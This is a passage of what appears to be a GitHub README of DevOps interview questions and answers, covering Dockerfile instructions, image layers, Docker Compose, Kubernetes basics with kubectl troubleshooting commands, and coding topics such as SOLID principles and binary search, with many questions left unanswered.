&lt;h5&gt;&lt;a id="user-content-dockerfile" class="anchor" aria-hidden="true" href="#dockerfile"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dockerfile&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is Dockerfile&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Docker can build images automatically by reading the instructions from a Dockerfile. A Dockerfile is a text document that contains all the commands a user could call on the command line to assemble an image.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between ADD and COPY in Dockerfile?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;COPY takes in a src and destination. It only lets you copy in a local file or directory from your host (the machine building the Docker image) into the Docker image itself.
ADD lets you do that too, but it also supports 2 other sources. First, you can use a URL instead of a local file / directory. Secondly, you can extract a tar file from the source directly into the destination.
Although ADD and COPY are functionally similar, generally speaking, COPY is preferred. That’s because it’s more transparent than ADD. COPY only supports the basic copying of local files into the container, while ADD has some features (like local-only tar extraction and remote URL support) that are not immediately obvious.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between CMD and RUN in Dockerfile?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;RUN lets you execute commands inside of your Docker image. These commands get executed once at build time and get written into your Docker image as a new layer.
CMD is the command the container executes by default when you launch the built image. A Dockerfile can only have one CMD.
You could say that CMD is a Docker run-time operation, meaning it’s not something that gets executed at build time. It happens when you run an image. A running image is called a container.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Do you perform any checks or testing related to your Dockerfile?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A common answer to this is to use &lt;a href="https://github.com/hadolint/hadolint"&gt;hadolint&lt;/a&gt; project which is a linter based on Dockerfile best practices.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Docker compose and what is it used for&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Compose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What are the differences between Docker compose, Docker swarm and Kubernetes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Docker interlock&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between Docker Hub and Docker cloud?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Docker Hub is a native Docker registry service which allows you to run pull
and push commands to install and deploy Docker images from the Docker Hub.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Docker Cloud is built on top of the Docker Hub so Docker Cloud provides
you with more options/features compared to Docker Hub. One example is
Swarm management which means you can create new swarms in Docker Cloud.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Where Docker images are stored?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
In DockerHub
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain image layers&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A Docker image is built up from a series of layers. Each layer represents an instruction in the image’s Dockerfile. Each layer except the very last one is read-only.
Each layer is only a set of differences from the layer before it. The layers are stacked on top of each other. When you create a new container, you add a new writable layer on top of the underlying layers. This layer is often called the “container layer”. All changes made to the running container, such as writing new files, modifying existing files, and deleting files, are written to this thin writable container layer.
The major difference between a container and an image is the top writable layer. All writes to the container that add new or modify existing data are stored in this writable layer. When the container is deleted, the writable layer is also deleted. The underlying image remains unchanged.
Because each container has its own writable container layer, and all changes are stored in this container layer, multiple containers can share access to the same underlying image and yet have their own data state.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-docker-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-6" class="anchor" aria-hidden="true" href="#star-advanced-6"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What best practices are you familiar related to working with containers?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you manage persistent storage in Docker?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How can you connect from the inside of your container to the localhost of your host, where the container runs?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you copy files from Docker container to the host and vice versa?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-kubernetes" class="anchor" aria-hidden="true" href="#kubernetes"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kubernetes&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-kubernetes-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-11" class="anchor" aria-hidden="true" href="#baby-beginner-11"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Kubernetes? What use cases is it good for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Kubernetes is an open-source system for automating deployment, scaling, and management of containerized applications.&lt;/p&gt;
&lt;p&gt;To understand what Kubernetes is good for, let's look at some examples:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;
&lt;p&gt;You would like to run a certain application in a container on multiple different locations. Sure, if it's 2-3 servers/locations, you can do it by yourself but it can be challenging to scale. Also, running them is not only running the container but also react on different events.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Performing updates and changes across hundreds of containers&lt;/p&gt;
&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Handle cases where the current load requires to scale up (or down)
&lt;/b&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;


&lt;details&gt;
&lt;summary&gt;Describe the architecture of Kubernetes&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a Kubernetes Cluster?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A cluster consists of a Master (which coordinates the cluster) and Nodes where the applications are running.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What the Master is responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;The master coordinates all the workflows in the cluster:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Scheduling applications&lt;/li&gt;
&lt;li&gt;Managing desired state&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Rolling out new updates
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is a Node?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A node is a virtual machine or a physical server that serves as a worker for running the applications.
It's recommended to have at least 3 nodes in Kubernetes production environment.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is Kubelet&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Kubelet is an agent running on each node and responsible for node communication with the master.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Minikube?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Minikube is a lightweight Kubernetes implementation. It create a local virtual machine and deploys a simple (single node) cluster.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is a Kubernetes pod&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False? A pod can manage multiple containers&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you monitor your Kubernetes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You suspect one of the pods is having issues, what do you do?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Start by inspecting the pods status. we can use the command &lt;code&gt;kubectl get pods&lt;/code&gt; (--all-namespaces for pods in system namespace)&lt;br&gt;&lt;/p&gt;
&lt;p&gt;If we see "Error" status, we can keep debugging by running the command &lt;code&gt;kubectl describe pod [name]&lt;/code&gt;. In case we still don't see anything useful we can try stern for log tailing.&lt;br&gt;&lt;/p&gt;
&lt;p&gt;In case we find out there was a temporary issue with the pod or the system, we can try restarting the pod with the following &lt;code&gt;kubectl scale deployment [name] --replicas=0&lt;/code&gt;&lt;br&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Setting the replicas to 0 will shut down the process. Now start it with &lt;code&gt;kubectl scale deployment [name] --replicas=1&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What the Kubernetes Scheduler does?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What happens to running pods if if you stop Kubelet on the worker nodes?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Describe how roll-back works&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-kubernetes-commands" class="anchor" aria-hidden="true" href="#kubernetes-commands"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Kubernetes Commands&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is kubectl?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you:
&lt;ul&gt;
&lt;li&gt;Check the cluster status?&lt;/li&gt;
&lt;li&gt;Check the status of the nodes?&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What the following commands do?
&lt;ul&gt;
&lt;li&gt;kubectl get nodes&lt;/li&gt;
&lt;li&gt;kubectl &lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is kubconfig? What do you use it for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-coding" class="anchor" aria-hidden="true" href="#coding"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Coding&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-coding-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-12" class="anchor" aria-hidden="true" href="#baby-beginner-12"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What programming language do you prefer to use for DevOps related tasks? Why specifically this one?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain expressions and statements&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;An expression is anything that results in a value (even if the value is None). Basically, any sequence of literals so, you can say that a string, integer, list, ... are all expressions.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Statements are instructions executed by the interpreter like variable assignments, for loops and conditionals (if-else).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Object Oriented Programming? Why is it important?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Are you familiar with SOLID design principals?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;SOLID design principals are about:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make it easier to extend the functionality of the system&lt;/li&gt;
&lt;li&gt;Make the code more readable and easier to maintain&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SOLID is:&lt;/p&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Single Responsibility - A class should only have a single responsibility&lt;/li&gt;
&lt;li&gt;Open-Closed - An entity should be open for extension, but closed for modification. What this practically means is that you should extend functionality by adding a new code and not by modifying it. Your system should be separated into components so it can be easily extended without breaking everything.&lt;/li&gt;
&lt;li&gt;Liskov Substitution - Any derived class should be able to substitute the its parent without altering its corrections. Practically, every part of the code will get the expected result no matter which part is using it&lt;/li&gt;
&lt;li&gt;Interface segregation - A client should never depend on anything it doesn't uses&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Dependency Inversion - High level modules should depend on abstractions, not low level modules
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What are the four pillars of object oriented programming?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain recursion&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Inversion of Control&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Dependency Injection&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what are design patterns and describe three of them in detail&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain big O notation&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-common-algorithms" class="anchor" aria-hidden="true" href="#common-algorithms"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Common algorithms&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Binary search:
&lt;ul&gt;
&lt;li&gt;How it works?&lt;/li&gt;
&lt;li&gt;Can you implement it? (in any language you prefer)&lt;/li&gt;
&lt;li&gt;What is the average performance of the algorithm you wrote?&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;

&lt;p&gt;It's a search algorithm used with sorted arrays/lists to find a target value by dividing the array each iteration and comparing the middle value to the target value. If the middle value is smaller than target value, then the target value is searched in the right part of the divided array, else in the left side. This continues until the value is found (or the array divided max times)&lt;/p&gt;
&lt;p&gt;&lt;a href="coding/python/binary_search.py"&gt;python implementation&lt;/a&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;The average performance of the above algorithm is O(log n). Best performance can be O(1) and worst O(log n).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-code-review" class="anchor" aria-hidden="true" href="#code-review"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code Review&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What are your code-review best practices?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Do you agree/disagree with each of the following statements and why?:
&lt;ul&gt;
&lt;li&gt;The commit message is not important. When reviewing a change/patch one should focus on the actual change&lt;/li&gt;
&lt;li&gt;You shouldn't test your code before submitting it. This is what CI/CD exists for.&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;h4&gt;&lt;a id="user-content-strings" class="anchor" aria-hidden="true" href="#strings"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Strings&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;In any language you want, write a function to determine if a given string is a palindrome&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;In any language you want, write a function to determine if two strings are Anagrams &lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-integers" class="anchor" aria-hidden="true" href="#integers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Integers&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;In any language you would like, print the numbers from 1 to a given integer. For example for input: 5, the output is: 12345&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-time-complexity" class="anchor" aria-hidden="true" href="#time-complexity"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Time Complexity&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Describe what would be the time complexity of the operations &lt;code&gt;access&lt;/code&gt;, &lt;code&gt;search&lt;/code&gt; &lt;code&gt;insert&lt;/code&gt; and &lt;code&gt;remove&lt;/code&gt; for the following data structures:&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Stack&lt;/li&gt;
&lt;li&gt;Queue&lt;/li&gt;
&lt;li&gt;Linked List&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Binary Search Tree
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is the complexity for the best, worst and average cases of each of the following algorithms?:
&lt;ul&gt;
&lt;li&gt;Quick sort&lt;/li&gt;
&lt;li&gt;Merge sort&lt;/li&gt;
&lt;li&gt;Bucket Sort&lt;/li&gt;
&lt;li&gt;Radix Sort&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

